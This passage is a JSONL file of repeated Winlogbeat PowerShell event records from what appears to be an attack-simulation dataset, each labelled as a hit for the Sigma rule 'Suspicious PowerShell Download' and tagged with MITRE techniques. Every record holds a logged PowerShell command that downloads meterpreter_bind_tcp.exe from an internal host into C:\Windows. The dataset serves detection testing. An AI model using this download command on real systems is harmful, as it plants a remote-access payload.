"falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 